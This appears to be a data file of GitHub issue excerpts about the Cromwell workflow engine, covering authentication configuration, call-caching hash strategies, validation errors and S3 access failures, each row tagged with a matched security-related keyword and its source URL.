with my project. In the Google [backends](https://cromwell.readthedocs.io/en/stable/backends/Google/) section of the docs there is a lonely mention of the `scheme = ""user_account""` but no further explanation. According to the [source code](https://github.com/broadinstitute/cromwell/blob/develop/cloudSupport/src/test/scala/cromwell/cloudsupport/gcp/GoogleConfigurationSpec.scala) it should be defined as:; ```; {; name = ""user-account""; scheme = ""user_account""; user = ""me""; secrets-file = ""/very/secret/file.txt""; data-store-dir = ""/where/the/data/at""; }; ```; But I was not able to get it to work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349:2935,authoriz,authorization,2935,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349,2,['authoriz'],['authorization']
Security,"main,; database=if defined(centrifuge.database) then centrifuge.database else ""refseq""; }; }; }; ```; The `centrifugeList` is a list of dictionaries. The resulting `centrifuge` `object` may or may not have a key database. . ## Expected behaviour:; `database` defaults to `""refseq""` if no `database` key is present in the dictionary. It will use the database key if it exists. ## Observed behaviour:; ```; java.lang.RuntimeException: Evaluating if defined(centrifuge.database) then centrifuge.database else ""refseq"" failed: Could not find key database in WdlObject; at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.$anonfun$processRunnable$2(ExpressionKey.scala:36); at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.$anonfun$processRunnable$2$adapted(ExpressionKey.scala:31); at scala.Function1.$anonfun$andThen$1(Function1.scala:52); at cats.data.Validated.fold(Validated.scala:14); at cats.data.Validated.bimap(Validated.scala:109); at cats.data.Validated.map(Validated.scala:152); at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.processRunnable(ExpressionKey.scala:31); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$4(WorkflowExecutionActor.scala:452); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$2(WorkflowExecutionActor.scala:449); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$1(WorkflowExecutionActor.scala:448); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processRunnableTaskCallInputExpression(WorkflowExecutionActor.scala:447); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$startRunnableNodes$4(WorkflowExecuti",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3093:1173,Validat,Validated,1173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3093,1,['Validat'],['Validated']
Security,"mapValues recomputes itself every time it is accessed. As stated in the original ticket, we have had fairly serious performance problems which traced back to the usage of mapValues.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2434#issuecomment-333308532:45,access,accessed,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2434#issuecomment-333308532,1,['access'],['accessed']
Security,"mazon.awssdk.awscore.client.handler.AwsSyncClientHandler.execute(AwsSyncClientHandler.java:55); cromwell_1 | 	at software.amazon.awssdk.services.sts.DefaultStsClient.getCallerIdentity(DefaultStsClient.java:673); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:86); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:76); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:91); cromwell_1 | 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); cromwell_1 | 	at scala.util.Try$.apply(Try.scala:213); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:91); cromwell_1 | 	... 46 more; cromwell_1 | ; cromwell_1 | 2020-03-15 16:09:58,022 cromwell-system-akka.dispatchers.engine-dispatcher-59 INFO - WorkflowManagerActor WorkflowActor-c4ee3308-f9bf-41d2-acdb-70c02b6cc4b3 is in a terminal state: WorkflowFailedState`. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5452:5770,PASSWORD,PASSWORDS,5770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5452,1,['PASSWORD'],['PASSWORDS']
Security,"me.callCaching`, the hashes field has the following attributes:; > - `output count`; > - `runtime attribute`; > - `output expression`; > - `input count`; > - `backend name`; > - `command template`; > - `input`. - ~When does the command section get hashed (before or after replacements)?~; > The template gets cached. - ~What other elements go into the building the cache?~; > output count, runtime attribute, output expression, input count, backend name, command template, input. - What are the downsides with `check-sibling-md5`, can it be used in conjunction with `system.file-hash-cache`. - **Is the only way to use call-caching with containers without fully hashing the file?**. ## Possible resolutions. I was thinking the following might be potential solutions for my problem, but I don't know how good / bad they are, and they'd require changes to Cromwell. - Potential for a _cheaper_ (and potentially dirtier) hash for files? ; - When cromwell links from a cached result, store a map of { newpath : original } link to use or call caching, so when the hashDifferential is calculated, it uses the hash of the original cached result. (This would mean we could use the path+modtime strategy). ## Current attempt. I realised I may have run into another error here: https://github.com/broadinstitute/cromwell/issues/5348. This is my current configuration, it will successfully pull cache for the FIRST step in a workflow, but then fail afterwards. <details><summary>Click to show configuration</summary><p>. ```hocon; include required(classpath(""application"")). system: {; ""job-shell"": ""/bin/sh"",; ""cromwell_id"": ""cromwell-fdcce1"",; ""cromwell_id_random_suffix"": false; }; database: {; ""db"": {; ""driver"": ""com.mysql.cj.jdbc.Driver"",; ""url"": ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true&useSSL=false&serverTimezone=UTC"",; ""user"": ""root"",; ""connectionTimeout"": 5000; },; ""profile"": ""slick.jdbc.MySQLProfile$""; }; backend: {; ""default"": ""Local"",; ""providers"": {; ""Local"": {; ""actor-fac",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:3580,hash,hash,3580,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,3,['hash'],"['hash', 'hashDifferential']"
Security,"me` did work. I was using less complex workflows that did not have this problem at the time. ## Call-caching problems with file strategy; The `file` strategy does work as it uses md5sums in order to calculate the file hash. An unfortunate side effect of this is that md5 uses massive system resources. On HPC systems that are the target for the sfs-backend, this is a big problem. Cromwell will be run from a submit node on the system and greedily grab all processing power on the submit node to calculate all the md5sums. . ## Md5sums; Md5sums are reliable hashes for file integrity, but this was not their intended purpose. Md5sum was intended as a cryptographic hash. A cryptographic hash has the following properties (wikipedia):; 1. it is deterministic, meaning that the same message always results in the same hash; 2. it is quick to compute the hash value for any given message; 3. it is infeasible to generate a message that yields a given hash value; 4. it is infeasible to find two different messages with the same hash value; 5. a small change to a message should change the hash value so extensively that the new hash value appears uncorrelated with the old hash value (avalanche effect). I contest point 2, in that many cryptographic explicitly strife for being slow to calculate in order to negate brute force attempts.; Anyway: for call caching we only need points 1. and 4. All the rest is unnecessary ballast. . ## xxHash; Luckily there is a hashing algorithm that is designed explicitly for content hashing only. It was made to generate reliably different hashes for file content as fast as possible. It's called [xxHash](https://www.xxhash.com). There are Java implementations available and I did [some extensive benchmarking](https://github.com/rhpvorderman/hashtest/) to find out which one was best. The xxh64 (xxhash for 64 bit machines) algorithm was 15 times faster than the java implementation of md5 we currently use in Cromwell. This PR implements the xxhash algorithm for c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450:1394,hash,hash,1394,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450,1,['hash'],['hash']
Security,"ment.execute(ProxyPreparedStatement.java:44); 	at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.execute(HikariProxyPreparedStatement.java); 	at slick.jdbc.StatementInvoker.results(StatementInvoker.scala:38); 	at slick.jdbc.StatementInvoker.iteratorTo(StatementInvoker.scala:21); 	at slick.jdbc.Invoker.foreach(Invoker.scala:47); 	at slick.jdbc.Invoker.foreach$(Invoker.scala:46); 	at slick.jdbc.StatementInvoker.foreach(StatementInvoker.scala:15); 	at slick.jdbc.StreamingInvokerAction.run(StreamingInvokerAction.scala:22); 	at slick.jdbc.StreamingInvokerAction.run$(StreamingInvokerAction.scala:20); 	at slick.jdbc.JdbcActionComponent$QueryActionExtensionMethodsImpl$$anon$1.run(JdbcActionComponent.scala:216); 	at slick.jdbc.JdbcActionComponent$QueryActionExtensionMethodsImpl$$anon$1.run(JdbcActionComponent.scala:216); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); 	at java.lang.Thread.run(Thread.java:745); 2018-11-12 21:58:32,022 cromwell-system-akka.dispatchers.engine-dispatcher-5 INFO - Cromwell 36 service started on 0:0:0:0:0:0:0:0:8000...; ```; ---; ### database conf info; ```; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; database {; driver = ""slick.driver.MySQLDriver$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true&useSSL=false&allowPublicKeyRetrieval=true""; user = ""user""; password = ""123456""; connectionTimeout = 5000; }; metadata {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:file:metadata-db-file-path;shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 3000; }; }; }; ```; if the metadata{...} is not set, than the error is same to #3346",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4382:3387,password,password,3387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4382,1,['password'],['password']
Security,mentToGraphNode.scala:49); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:82); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.graphNodeCreationFold$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:77); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$6(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); scala.collection.immutable.List.foldLeft(List.scala:86); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$5(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.makeWomGraph(WorkflowDefinitionElementToWomWorkflowDefinition.scala:87); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$convertGraphElements$3(WorkflowDefinitionElementToWomWorkflowDefinition.scala:64); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.convertGraphElements(WorkflowDefinitionElementToWomWorkflowDefinition.scala:63); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.convert(WorkflowDefinitionElementToWomWorkflowDefinition.scala:38); wdl.draft3.transforms.wdlom2wom.package$.$anonfun$workflowDefinitionElementToWomWorkflowDefinition$1(package.scala:12); common.transforms.package$CheckedAtoB$.$anonfun$runThenCheck$1(package.scala:,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:4770,validat,validation,4770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validation']
Security,mentToGraphNode.scala:49); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:82); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.graphNodeCreationFold$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:77); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$6(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); scala.collection.immutable.List.foldLeft(List.scala:86); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$5(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.makeWomGraph(WorkflowDefinitionElementToWomWorkflowDefinition.scala:87); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$convertGraphElements$3(WorkflowDefinitionElementToWomWorkflowDefinition.scala:64); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.convertGraphElements(WorkflowDefinitionElementToWomWorkflowDefinition.scala:63); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.$anonfun$convertOuterScatter$10(ScatterElementToGraphNode.scala:72); scala.Function3.$anonfun$tupled$1(Function3.scala:35); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); common.validation.ErrorOr$ShortCircuitingFlatMapTuple3$.flatMapN$extens,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:2419,validat,validation,2419,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validation']
Security,"mes \; /home/lichtens/eval-gatk-protected/scripts/crsp_validation/crsp_validation_gatkp_run_local_paths.json.metadata.json; ```. Error message:. ```; [2016-09-21 17:51:25,15] [error] Expression evaluation failed due to wdl4s.WdlExpressionException: Cannot perform operation: WdlString(broadinstitute) / WdlString(gatk): WdlExpression((Subtract: lhs=(Divide: lhs=<string:1:1 identifier ""YnJvYWRpbnN0aXR1dGU="">, rhs=<string:1:16 identifier ""Z2F0aw=="">), rhs=<string:1:21 identifier ""cHJvdGVjdGVk"">)); java.lang.RuntimeException: Expression evaluation failed due to wdl4s.WdlExpressionException: Cannot perform operation: WdlString(broadinstitute) / WdlString(gatk): WdlExpression((Subtract: lhs=(Divide: lhs=<string:1:1 identifier ""YnJvYWRpbnN0aXR1dGU="">, rhs=<string:1:16 identifier ""Z2F0aw=="">), rhs=<string:1:21 identifier ""cHJvdGVjdGVk"">)); at cromwell.backend.validation.RuntimeAttributesValidation$class.validateOptionalExpression(RuntimeAttributesValidation.scala:319); at cromwell.backend.validation.RuntimeAttributesValidation$$anon$1.validateOptionalExpression(RuntimeAttributesValidation.scala:90); at cromwell.backend.sfs.SharedFileSystemInitializationActor$$anonfun$runtimeAttributeValidators$1$$anonfun$apply$1.apply(SharedFileSystemInitializationActor.scala:48); at cromwell.backend.sfs.SharedFileSystemInitializationActor$$anonfun$runtimeAttributeValidators$1$$anonfun$apply$1.apply(SharedFileSystemInitializationActor.scala:48); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$badRuntimeAttrsForTask$1$2.apply(BackendWorkflowInitializationActor.scala:141); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$badRuntimeAttrsForTask$1$2.apply(BackendWorkflowInitializationActor.scala:139); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245); at scala.collection.immutable.Map$Map3.foreach(Map.scala:161); ....snip....; ```. default_runtime:.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1465:1692,validat,validation,1692,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1465,1,['validat'],['validation']
Security,"mes over, as this task is called by a scatter function. Other steps in the pipeline are able to successfully use caching and get localized via soft/hard links, which rules out a configuration issue, and issues are only found right when using the ""Directory"" Type. To help in understanding my setup, I've included:. **inputs:**; ```; {; ""good_donor_good_recipient.blastdb"": ""../../data/blast/blastdb"",; ""good_donor_good_recipient.fasta"": ""../../data/ref_genomes/pseudomonas.fasta"",; }; ```. **task definition:**; ```; version development; task n {; input {; File fasta ; Directory blastdb; String out_file = ""~{basename(fasta)}.blast""; }; command <<<; export BLASTDB=~{blastdb} ; blastn \; -query ~{fasta} -db nt -num_threads 24 -evalue 1 -outfmt '6' -out ~{out_file}; >>>; output { File out = out_file }; runtime { docker: ""ncbi/blast:2.10.1"" }; }; ```. **confiuration snippet - localization only:**; ```; filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; # Call caching strategies; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""md5""; check-sibling-md5: false; }; }; }; ```. **logs:**; ```; [2020-08-08 19:20:00,49] [error] Failed to hash ""../../data/blast/blastdb"": Is a directory; [2020-08-08 19:20:00,49] [warn] Localization via hard link has failed: /workflows/cromwell-executions/good_donor_good_recipient/f7947643-2729-483f-b987-44ef932f88bd/call-blaster/main/6e4fa8a1-0d72-486e-a9ae-254319c4915d/call-blaster/shard-20/inputs/2058596876/blastdb -> /data/blast/blastdb: Operation not permitted; [2020-08-08 19:20:00,49] [error] 6e4fa8a1:main.blaster:46:1: Hash error (Is a directory), disabling call caching for this job.; ```. **contents of the BLASTDB directory:**; ```; /data/blast/blastdb$ ls; nt.00.nhd nt.01.nhd nt.02.nhd nt.03.nhd nt.04.nhd nt.05.nhd nt.06.nhd nt.07.nhd nt.08.nhd nt.09.nhd nt.10.nhd nt.11.nhd nt.12.nhd nt.13.nhd nt.14.nhd nt.15.nhd nt.16.nhd nt.17.nhd nt.18.nhd nt.19.nhd nt.20.nhd nt.21.nhd nt.2",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5737:1517,hash,hashing-strategy,1517,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5737,1,['hash'],['hashing-strategy']
Security,metadata: when does the hash contains the file paths ?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316:24,hash,hash,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316,1,['hash'],['hash']
Security,mon.transforms.package$CheckedAtoB$.$anonfun$runThenCheck$1(package.scala:15); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$6(FileElementToWomBundle.scala:54); cats.instances.VectorInstances$$anon$1.$anonfun$traverse$2(vector.scala:77); cats.instances.VectorInstances$$anon$1.loop$2(vector.scala:40); cats.instances.VectorInstances$$anon$1.$anonfun$foldRight$2(vector.scala:41); cats.Eval$.advance(Eval.scala:272); cats.Eval$.loop$1(Eval.scala:354); cats.Eval$.cats$Eval$$evaluate(Eval.scala:372); cats.Eval$Defer.value(Eval.scala:258); cats.instances.VectorInstances$$anon$1.traverse(vector.scala:76); cats.instances.VectorInstances$$anon$1.traverse(vector.scala:12); cats.Traverse$Ops.traverse(Traverse.scala:19); cats.Traverse$Ops.traverse$(Traverse.scala:19); cats.Traverse$ToTraverseOps$$anon$3.traverse(Traverse.scala:19); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$5(FileElementToWomBundle.scala:51); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWorkflowInner$1(FileElementToWomBundle.scala:48); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$14(FileElementToWomBundle.scala:77); scala.Function2.$anonfun$tupled$1(Function2.scala:48); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); common.validation.ErrorOr$ShortCircuitingFlatMapTuple2$.flatMapN$extension(ErrorOr.scala:49); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$12(FileElementToWomBundle.scala:77); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWomBundle(FileElementToWomBundle.scala:75); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWomBundle(FileElementToWomBundle.scala:30); wom.transforms.WomBundleMake,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:6697,validat,validation,6697,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validation']
Security,"mptible: preemptible_tries; }; output {; File recalibration_report = ""${recalibration_report_filename}""; }; }; ```. And here is my cromwell server config:. ```scala; include required(classpath(""application"")). webservice {; port = 8000; }. system {; workflow-restart = true; }. engine {; filesystems {. gcs {; auth = ""service-account""; }. http {}. local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; }; }; }. backend {; default = ""Local""; providers {. Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; max-concurrent-workflows = 1; concurrent-job-limit = 1; }; }. PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; project = ""bioinfo-XXXXXXX""; root = ""gs://XXXXXXXX""; genomics-api-queries-per-100-seconds = 1000; max-concurrent-workflows = 80; concurrent-job-limit = 200; maximum-polling-interval = 600. genomics {; # Config from google stanza; auth = ""service-account"". ; # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; localization-attempts = 3; }. filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""service-account""; }; }; }; }; }; }. # Google authentication; google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; },; {; name = ""service-account""; scheme = ""service_account""; service-account-id = ""XXXXXXXXXXXXXX@XXXXXXXXXXXX.gserviceaccount.com""; json-file = ""/var/secrets/google/key.json""; }; ]; }. # database connection; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://cromwell-db/cromwell?rewriteBatchedStatements=true&useSSL=false""; user = ""XXXXXXXXXXX""; password = ""XXXXXXXXXXX""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336:2796,authenticat,authentication,2796,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336,2,"['authenticat', 'password']","['authentication', 'password']"
Security,mwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; :; Disk strings should be of the format 'local-disk SIZE TYPE' or '/mount/point SIZE TYPE' but got: '10 HDD'; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(PipelinesApiAsyncBackendJobExecutionActor.scala:87); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.validatedRuntimeAttributes(PipelinesApiAsyncBackendJobExecutionActor.scala:87); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(PipelinesApiAsyncBackendJobExecutionActor.scala:534); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.startMetadataKeyValues(PipelinesApiAsyncBackendJobExecutionActor.scala:534); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:951); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncEx,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4918:1443,validat,validatedRuntimeAttributes,1443,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4918,1,['validat'],['validatedRuntimeAttributes']
Security,"mwell.engine.workflow.lifecycle.finalization.CopyWorkflowOutputsActor.aroundReceive(CopyWorkflowOutputsActor.scala:28); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2019-02-28 08:30:32,176 cromwell-system-akka.dispatchers.engine-dispatcher-28 ERROR - WorkflowManagerActor Workflow bd18e464-59a2-44cf-80c2-b4d93bdfe0ce failed (during FinalizingWorkflowState): software.amazon.awssdk.services.s3.model.S3Exception: Access Denied (Service: S3Client; Status Code: 403; Request ID: FA1C7E97A7A33EDC); 	at software.amazon.awssdk.core.http.pipeline.stages.HandleResponseStage.handleErrorResponse(HandleResponseStage.java:114); 	at software.amazon.awssdk.core.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:72); 	at software.amazon.awssdk.core.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:57); 	at software.amazon.awssdk.core.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:40); 	at software.amazon.awssdk.core.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:239); 	at software.amazon.awssdk.core.http.pipeline.stages.TimerExceptionHandlingStage.execute(TimerExceptionHandlingStage.java:40); 	at software.amazon.awssdk.core.http.pipeline.stages.TimerExceptionHandlingStage.execute(TimerExceptionHandlingStage.java:30); 	at software.amazon.awssdk.core.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(Retryabl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686:7076,Access,Access,7076,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686,1,['Access'],['Access']
